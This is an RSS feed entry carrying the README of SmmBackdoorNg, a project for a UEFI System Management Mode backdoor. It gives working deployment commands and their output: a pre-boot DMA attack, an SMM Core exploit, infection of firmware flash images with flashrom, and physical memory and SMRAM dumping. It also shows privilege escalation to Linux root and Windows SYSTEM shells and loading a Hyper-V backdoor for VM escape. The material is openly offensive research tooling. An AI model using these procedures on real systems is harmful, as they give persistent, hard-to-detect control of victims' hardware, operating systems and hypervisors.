<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-10-12T01:24:04Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Cr4sh/SmmBackdoorNg</title>
    <updated>2023-10-12T01:24:04Z</updated>
    <id>tag:github.com,2023-10-12:/Cr4sh/SmmBackdoorNg</id>
    <link href="https://github.com/Cr4sh/SmmBackdoorNg" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Updated version of System Management Mode backdoor for UEFI based platforms: old dog, new tricks&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;SMM Backdoor Next Gen&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#general-information&#34;&gt;General information&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#backdoor-usage&#34;&gt;Backdoor usage&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#deploying-the-backdoor-using-firmware-flash-image-infection&#34;&gt;Deploying the backdoor using firmware flash image infection&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#using-together-with-hyper-v-backdoor&#34;&gt;Using together with Hyper-V Backdoor&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#building-from-the-source-code&#34;&gt;Building from the source code&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;General information&lt;/h2&gt; &#xA;&lt;p&gt;This version of System Management Mode backdoor for UEFI based platforms was heavily inspired by &lt;a href=&#34;http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html&#34;&gt;my previous project&lt;/a&gt; (check &lt;a href=&#34;https://github.com/Cr4sh/SmmBackdoor&#34;&gt;its GitHub repository&lt;/a&gt;) but introducing few key changes in order to make it more up to date:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In addition to the usual firmware flash image infection method as described in the article, new SMM backdoor also can be deployed with pre-boot DMA attack using &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze&#34;&gt;PCI Express DIY hacking toolkit&lt;/a&gt; (see &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze/raw/master/python/uefi_backdoor_simple.py&#34;&gt;uefi_backdoor_simple.py&lt;/a&gt; program usage for more details) and industry-wide EFI SMM Core &lt;a href=&#34;https://github.com/Cr4sh/SmmBackdoorNg/raw/main/src/exploit.c&#34;&gt;vulnerability exploitation&lt;/a&gt; to perform DXE to SMM execution transition. The vulnerability &lt;a href=&#34;https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00144.html&#34;&gt;INTEL-SA-00144&lt;/a&gt; was discovered by myself and reported to Intel PSIRT &lt;a href=&#34;https://twitter.com/d_olex/status/877718172366798848&#34;&gt;years ago&lt;/a&gt;, but it still remains not patched on many products that using old EDK2 derived firmware code, including whole &lt;a href=&#34;https://www.ami.com/aptio/&#34;&gt;AMI Aptio&lt;/a&gt; family. Latest generations of Intel machines are likely not vulnerable to this attack.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Client program &lt;code&gt;smm_backdoor.py&lt;/code&gt; supports Windows and Linux systems and can interact with SMM backdoor using SW SMI (requires high privileges and &lt;a href=&#34;https://github.com/chipsec/chipsec&#34;&gt;chipsec&lt;/a&gt; installed) or APIC periodic timer method that can work with any privileges level.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;There&#39;s &lt;code&gt;smm_backdoor_privesc_linux.py&lt;/code&gt; and &lt;code&gt;smm_backdoor_privesc_win.py&lt;/code&gt; test client programs for SMM backdoor that demonstrating local privileges escalation under Windows and Linux by using its API provided by &lt;code&gt;smm_backdoor.py&lt;/code&gt; library.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;SMM backdoor is fully virtualization-aware now, its library and client programs can work as expected inside Windows or Linux virtual machines running on the infected host system.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;SMM backdoor also can be used to load &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv&#34;&gt;my Hyper-V backdoor&lt;/a&gt; (which is also part of PCI Express DIY hacking toolkit) into the currently running hypervisor during RT phase and perform guest to host VM escape attacks. Test client program &lt;code&gt;smm_backdoor_hyper_v.py&lt;/code&gt; is used for integration with Hyper-V backdoor and its deployment.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Backdoor usage&lt;/h2&gt; &#xA;&lt;p&gt;Project documentation is incomplete at this moment, but here&#39;s some command line examples.&lt;/p&gt; &#xA;&lt;p&gt;Deploying SMM backdoor UEFI driver with PCI Express DIY hacking toolkit using &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze#practical-dma-attacks&#34;&gt;pre-boot DMA attack&lt;/a&gt;, DXE to SMM execution transition exploit mentioned above will be started automatically once backdoor driver will be loaded:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 uefi_backdoor_simple.py --driver SmmBackdoorNg_X64.efi&#xA;[+] Using UEFI system table hook injection method&#xA;[+] Reading DXE phase payload from SmmBackdoorNg_X64.efi&#xA;[+] Waiting for PCI-E link...&#xA;[!] PCI-E endpoint is not configured by root complex yet&#xA;[!] PCI-E endpoint is not configured by root complex yet&#xA;[!] Bad MRd TLP completion received&#xA;[+] PCI-E link with target is up&#xA;[+] Device address is 01:00.0&#xA;[+] Looking for DXE driver PE image...&#xA;[+] PE image is at 0x7a070000&#xA;[+] EFI_SYSTEM_TABLE is at 0x7a03e018&#xA;[+] EFI_BOOT_SERVICES is at 0x7a38fa30&#xA;[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x7a3987b4&#xA;Backdoor image size is 0x49a0&#xA;Backdoor entry RVA is 0x20fc&#xA;Planting DXE stage driver at 0xc0000...&#xA;Hooking LocateProtocol(): 0x7a3987b4 -&amp;gt; 0x000c20fc&#xA;1.852231 sec.&#xA;[+] DXE driver was planted, waiting for backdoor init...&#xA;[+] DXE driver was executed&#xA;[+] DONE&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In case if you&#39;re going to deploy SMM backdoor with PCI Express DIY hacking toolkit − I would recommend to get used &lt;a href=&#34;https://www.xilinx.com/products/boards-and-kits/ek-z7-zc706-g.html&#34;&gt;Xilinx ZC706&lt;/a&gt; from e-Bay rather than &lt;a href=&#34;https://www.xilinx.com/products/boards-and-kits/ek-s6-sp605-g.html&#34;&gt;older SP605&lt;/a&gt; evaluation kit, since this board has &lt;a href=&#34;https://github.com/Cr4sh/zc_pcie_dma&#34;&gt;better design&lt;/a&gt;, can perform DMA attacks faster and its &lt;a href=&#34;https://www.xilinx.com/products/design-tools/vivado.html&#34;&gt;development tools&lt;/a&gt; are more suitable for modern day use.&lt;/p&gt; &#xA;&lt;p&gt;In addition, you also can deploy the backdoor using &lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#deploying-the-backdoor-using-firmware-flash-image-infection&#34;&gt;firmware flash image infection&lt;/a&gt; described below in the next section.&lt;/p&gt; &#xA;&lt;p&gt;Basic use of SMM backdoor &lt;code&gt;smm_backdoor.py&lt;/code&gt; client program to display backdoor debug messages buffer once it was loaded and system has been booted:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 smm_backdoor.py --debug&#xA;****** Chipsec Linux Kernel module is licensed under GPL 2.0&#xA;[+] Obtaining backdoor debug information...&#xA;[+] Debug output buffer physical address is 0x79da4000&#xA;&#xA;00000001 - backdoor.c(1573) : ******************************&#xA;00000002 - backdoor.c(1574) :&#xA;00000003 - backdoor.c(1575) :   SMM backdoor loaded&#xA;00000004 - backdoor.c(1576) :&#xA;00000005 - backdoor.c(1577) : ******************************&#xA;00000006 - backdoor.c(1589) : Resident code base address is 0x79d9f000&#xA;00000007 - backdoor.c(1502) : BackdoorResidentDma()&#xA;00000008 - backdoor.c(313) : Protocol notify handler is at 0x79d9f364&#xA;00000009 - backdoor.c(1423) : SMM access 2 protocol is at 0x778fe650&#xA;00000010 - backdoor.c(1424) : Available SMRAM regions:&#xA;00000011 - backdoor.c(1434) :  * 0x7b000000:0x7b000fff&#xA;00000012 - backdoor.c(1434) :  * 0x7b001000:0x7b7fffff&#xA;00000013 - exploit.c(242) : SMM communicate header is at 0x79da2ae0&#xA;00000014 - exploit.c(256) : Executing SMM callback...&#xA;00000015 - backdoor.c(1215) : Running in SMM&#xA;00000016 - backdoor.c(1216) : SMM system table is at 0x7b7f84c0&#xA;00000017 - backdoor.c(1177) : Max. SW SMI value is 0xff&#xA;00000018 - backdoor.c(1188) : SW SMI handler is at 0x7b5effb8&#xA;00000019 - exploit.c(271) : Communicate(): status = 0xe, size = 0x19&#xA;00000020 - exploit.c(277) : Exploit(): Exploitation success&#xA;00000021 - backdoor.c(409) : SmmCtlHandle(): Periodic timer SW SMI was enabled&#xA;00000022 - backdoor.c(1328) : new_SetVirtualAddressMap()&#xA;00000023 - backdoor.c(1369) : New address of the resident image is 0xfffffffeec79f000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Check for responding backdoor and show basic information about System Management Mode execution environment:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 smm_backdoor.py --use-timer --test&#xA;[+] Checking if SMM backdoor is present...&#xA;[+] Obtaining information...&#xA;&#xA;  CR0 = 0x80000033&#xA;  CR3 = 0x7b7b1000&#xA; SMST = 0x7b7f84c0&#xA;&#xA;[+] SMRAM regions:&#xA;&#xA; * 0x7b000000:7b000fff&#xA; * 0x7b001000:7b7fffff&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example of reading of arbitrary physical memory, beginning of SMRAM region in this case:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 smm_backdoor.py --use-timer --read-phys 0x7b000000 --size 0x80&#xA;7b000000: 53 4d 4d 53 33 5f 36 34 90 c5 7d 7b 00 00 00 00 | SMMS3.64........&#xA;7b000010: 00 60 7a 7b 00 00 00 00 00 80 00 00 00 00 00 00 | ..z.............&#xA;7b000020: 33 00 00 80 00 00 00 00 00 10 7b 7b 00 00 00 00 | 3...............&#xA;7b000030: 68 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | h...............&#xA;7b000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................&#xA;7b000050: 00 00 00 00 00 00 00 00 00 00 c0 84 7f 7b 00 00 | ................&#xA;7b000060: 00 00 e1 13 e0 12 e0 12 f0 12 e1 13 f1 03 f1 03 | ................&#xA;7b000070: f1 02 e1 13 e0 12 e0 12 e0 02 e1 13 f1 03 f1 03 | ................&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To read and dump entire SMRAM regions into the file you can use the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 smm_backdoor.py --dump-smram&#xA;****** Chipsec Linux Kernel module is licensed under GPL 2.0&#xA;[+] Dumping SMRAM regions, this may take a while...&#xA;[+] Creating SMRAM_dump_7b000000_7b7fffff.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example of &lt;code&gt;smm_backdoor_privesc_linux.py&lt;/code&gt; client program usage for local privileges escalation under the Linux operating system:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ python2 smm_backdoor_privesc_linux.py&#xA;[+] Initializing SMM backdoor client...&#xA;[+] User CR3 = 0x271b14000&#xA;[+] LSTAR = 0xffffffff81e00010&#xA;[+] do_syscall_64() is at 0xffffffff810025c0&#xA;[+] sys_call_table() is at 0xffffffff822001a0&#xA;[+] sys_getuid() is at 0xffffffff81073c10&#xA;[+] task_struct offset is 0x14d40&#xA;[+] cred offset is 0x628&#xA;[+] IA32_KERNEL_GS_BASE = 0xffff888277a00000&#xA;[+] Process task_struct is at 0xffff88827148db00&#xA;[+] Process cred is at 0xffff88827289d000&#xA;[+] Overwriting process credentials...&#xA;[+] Done, spawning root shell...&#xA;&#xA;sh-4.4# id&#xA;uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),26(tape),27(video)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example of &lt;code&gt;smm_backdoor_privesc_win.py&lt;/code&gt; client program usage for local privileges escalation under the Windows operating system:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; python2 smm_backdoor_privesc_win.py&#xA;[+] Initializing SMM backdoor client...&#xA;[+] NT version is 10.0.19041&#xA;[+] _EPROCESS Token offset is 0x04b8&#xA;[+] _KPCR KernelDirectoryTableBase offset is 0x9000&#xA;[+] _KPCR structure is at 0xfffff8005f486000&#xA;[+] KVA shadow is disabled or not present&#xA;[+] Kernel CR3 value is 0x0000000141491000&#xA;[+] Token object address is 0xffffcd0ef752c060&#xA;[+] Present privileges: 0x1e73deff20 -&amp;gt; 0x1ff2ffffbc&#xA;[+] Enabled privileges: 0x60900000 -&amp;gt; 0x1ff2ffffbc&#xA;[+] Current process object address is 0xffffa60de954a080&#xA;[+] System process object address is 0xffffa60de12dd080&#xA;[+] Overwriting process token...&#xA;[+] Done, spawning SYSTEM shell...&#xA;&#xA;Microsoft Windows [Version 10.0.19041.208]&#xA;(c) 2020 Microsoft Corporation. All rights reserved.&#xA;&#xA;C:\&amp;gt; whoami&#xA;nt authority\system&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Deploying the backdoor using firmware flash image infection&lt;/h2&gt; &#xA;&lt;p&gt;To infect platform firmware stored in the flash chip on the motherboard with SMM backdoor you will need some SPI flash programmer, I prefer to use cheap and widely available &lt;a href=&#34;https://www.ftdichip.com/Support/Documents/DataSheets/Modules/DS_FT2232H_Mini_Module.pdf&#34;&gt;FT2232H Mini Module&lt;/a&gt; from FTDI. Also, there&#39;s a &lt;a href=&#34;https://www.crowdsupply.com/securinghw/tigard&#34;&gt;board called Tigrad&lt;/a&gt; − multi-protocol, multi-voltage tool for hardware hacking that can work as SPI flash programmer. In addition to the programmer you also will need the following tools:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/LongSoft/UEFITool/releases/tag/0.28.0&#34;&gt;UEFITool&lt;/a&gt; utility to parse and edit UEFI flash images&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/flashrom/flashrom/releases/tag/v1.2&#34;&gt;Flashrom&lt;/a&gt; utility to work with SPI flash programmer&lt;/li&gt; &#xA; &lt;li&gt;SOIC8 &lt;a href=&#34;https://www.sparkfun.com/products/13153&#34;&gt;test clip&lt;/a&gt; or &lt;a href=&#34;https://www.sparkfun.com/products/9741&#34;&gt;probe hook&lt;/a&gt; clips kit to connect programmer to the flash chip without its de-soldering&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;First of all, you have to disassemble the machine and locate SPI flash chip with platform firmware. Usually, it&#39;s &lt;a href=&#34;https://www.winbond.com/resource-files/w25q64fv%20revq%2006142016.pdf&#34;&gt;W25Q64&lt;/a&gt; or &lt;a href=&#34;https://www.winbond.com/resource-files/w25q128fv_revhh1_100913_website1.pdf&#34;&gt;W25Q128&lt;/a&gt; Windbond NOR flash in SOIC8 package. Then you have to connect the chip to the FT2232H Mini Module. It’s more convenient to use SOIC8 test clip than probe hook clips, but very often there’s not enough free space around the chip to place test clip.&lt;/p&gt; &#xA;&lt;p&gt;In case if you happen to find WSON8 packaged chip on you board instead of usual SOIC8 − you can either de-solder it or use some sort of DIY &lt;a href=&#34;https://mouser.com/c/?q=pogo%20pin&#34;&gt;spring-loaded pogo pin&lt;/a&gt; test probe like this one to tap its pads:&lt;/p&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/spi_probe.jpg&#34; width=&#34;424&#34;&gt; &#xA;&lt;p&gt;Flash chip must be connected to the channel A of FT2232 Mini Module by the following scheme:&lt;/p&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/spi_wiring.png&#34; width=&#34;542&#34;&gt; &#xA;&lt;p&gt;Now you can read flash chip contents using Flashrom:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# flashrom -p ft2232_spi:type=2232H,port=A –r firmware.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After that you need to open dumped firmware in UEFITool, locate arbitrary UEFI SMM driver to infect and extract its PE32 image section from the firmware image:&lt;/p&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/uefi_tool.png&#34; width=&#34;701&#34;&gt; &#xA;&lt;p&gt;For example, I picked &lt;code&gt;NvramSmm&lt;/code&gt; UEFI SMM driver responsible for NVRAM access as pretty much suitable one. Then you can infect extracted driver with SMM backdoor using &lt;code&gt;--infect&lt;/code&gt; command line option of &lt;code&gt;smm_backkdoor.py&lt;/code&gt; program:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 smm_backkdoor.py --infect NvramSmm.bin --output NvramSmm_infected.bin --payload SmmBackdoorNg_X64.efi&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After that you have to replace original driver image with &lt;code&gt;NvramSmm_infected.bin&lt;/code&gt; one in UEFITool, save resulting firmware image and flash it back into the chip:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# flashrom -p ft2232_spi:type=2232H,port=A –w firmware_infected.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Using together with Hyper-V Backdoor&lt;/h2&gt; &#xA;&lt;p&gt;Once you have SMM backdoor loaded, as it shown above, you can use its capabilities to load Hyper-V backdoor during runtime phase with appropriate client program running inside arbitrary guest or host Hyper-V partition.&lt;/p&gt; &#xA;&lt;p&gt;To do that you need to save &lt;code&gt;backdoor.bin&lt;/code&gt; file &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze/raw/master/python/payloads/DmaBackdoorHv/backdoor.bin&#34;&gt;form Hyper-V backdoor repository&lt;/a&gt; as &lt;code&gt;hyper_v_backdoor.bin&lt;/code&gt; in the same folder with &lt;code&gt;smm_backdoor_hyper_v.py&lt;/code&gt; test client program and then just run it:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; python2 smm_backdoor_hyper_v.py&#xA;[+] Initializing SMM backdoor client...&#xA;[+] Searching for VMCS structure in physical memory, this might take a while...&#xA;&#xA; Scan step: 0x0000000001000000&#xA; Scan from: 0x0000000100000000&#xA;   Scan to: 0x0000000200000000&#xA;&#xA;[+] Hypervisor VMCS structure was found&#xA;&#xA; Physical address: 0x0000000109341000&#xA;         HOST_CR3: 0x0000000100103000&#xA;         HOST_RIP: 0xfffff87b6963236a&#xA;&#xA;[+] HvlpLowMemoryStub() is at 0x0000000000002000&#xA;[+] Host operating system version is 2004&#xA;[+] VM exit handler is at 0xfffff87b6960e010&#xA;[+] VM exit handler call is at 0xfffff87b69632440&#xA;[+] 14 bytes jump is at 0xfffff87b69632466&#xA;[+] Backdoor entry is at 0x0000000000002700&#xA;[+] Backdoor code size is 860 bytes&#xA;[+] Patching VM exit handler call...&#xA;[+] Done, Hyper-V backdoor was successfully installed&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In case when &lt;code&gt;smm_backdoor_hyper_v.py&lt;/code&gt; is unable to locate target VMCS region − you can override its default scanning options by specifying appropriate values in &lt;code&gt;--scan-from&lt;/code&gt;, &lt;code&gt;--scan-to&lt;/code&gt; and &lt;code&gt;--scan-step&lt;/code&gt; command line arguments of the program. Since VMCS region location stage might take a while, you also can use &lt;code&gt;--verbose&lt;/code&gt; option of the program to display operation progress information.&lt;/p&gt; &#xA;&lt;p&gt;After successful Hyper-V backdoor load you can run &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv/backdoor_client/backdoor_client&#34;&gt;its client program&lt;/a&gt; to ensure that backdoor is up and responding:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; .\hyper_v_backdoor_client.exe 0&#xA;[+] Running on CPU #0&#xA;[+] Hyper-V backdoor is running&#xA;&#xA;      Hypervisor CR0: 0x80010031&#xA;      Hypervisor CR3: 0x100103000&#xA;      Hypervisor CR4: 0x422e0&#xA; Hypervisor IDT base: 0xfffff87b69a00180 (limit = 0xffff)&#xA;  Hypervisor GS base: 0xfffff87b69ba6000&#xA;        VMCS address: 0x109341000&#xA;     VM exit handler: 0xfffff87b6960e010&#xA;       VM exit count: 0x86ed&#xA;       VM call count: 0x2518&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more information about Hyper-V backdoor client program and performing guest to host VM escape attacks on Windows targets you can &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv#vm-escape-related-commands&#34;&gt;check usage examples&lt;/a&gt; in Hyper-V backdoor documentation.&lt;/p&gt; &#xA;&lt;h2&gt;Building from the source code&lt;/h2&gt; &#xA;&lt;p&gt;To compile SMM backdoor UEFI driver &lt;code&gt;SmmBackdoorNg_X64.efi&lt;/code&gt; you need to have a Windows machine with &lt;a href=&#34;https://visualstudio.microsoft.com/downloads/&#34;&gt;Visual Studio&lt;/a&gt; and &lt;a href=&#34;https://github.com/tianocore/edk2&#34;&gt;EDK II source code&lt;/a&gt; installed.&lt;/p&gt; &#xA;&lt;p&gt;To build project from the source code you need to perform the following steps:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Install Visual Studio and EDK II &lt;a href=&#34;https://github.com/tianocore/tianocore.github.io/wiki/Common-instructions&#34;&gt;following its setup instructions&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Copy &lt;code&gt;SmmBackdoorNg&lt;/code&gt; project directory into the EDK source code directory.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Edit &lt;code&gt;Conf/target.txt&lt;/code&gt; file of EDK, set &lt;code&gt;ACTIVE_PLATFORM&lt;/code&gt; value to &lt;code&gt;OvmfPkg/OvmfPkgX64.dsc&lt;/code&gt; and &lt;code&gt;TOOL_CHAIN_TAG&lt;/code&gt; in according to your installed version of Visual Studio.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Edit &lt;code&gt;OvmfPkg/OvmfPkgX64.dsc&lt;/code&gt; file of EDK and add &lt;code&gt;SmmBackdoorNg/SmmBackdoorNg.inf&lt;/code&gt; line at its end.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Open Visual Studio command prompt and change current directory to previously copied &lt;code&gt;SmmBackdoorNg&lt;/code&gt; directory.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Execute &lt;code&gt;build&lt;/code&gt; command to compile SMM backdoor UEFI driver.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Resulting image file will be created in appropriate sub-directory of &lt;code&gt;Build/OvmfX64/&lt;/code&gt; EDK directory depending on used build target and Visual Studio version.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;About&lt;/h2&gt; &#xA;&lt;p&gt;Developed by:&lt;br&gt; Dmytro Oleksiuk (aka Cr4sh)&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;mailto:cr4sh0@gmail.com&#34;&gt;cr4sh0@gmail.com&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;http://blog.cr4.sh&#34;&gt;http://blog.cr4.sh&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>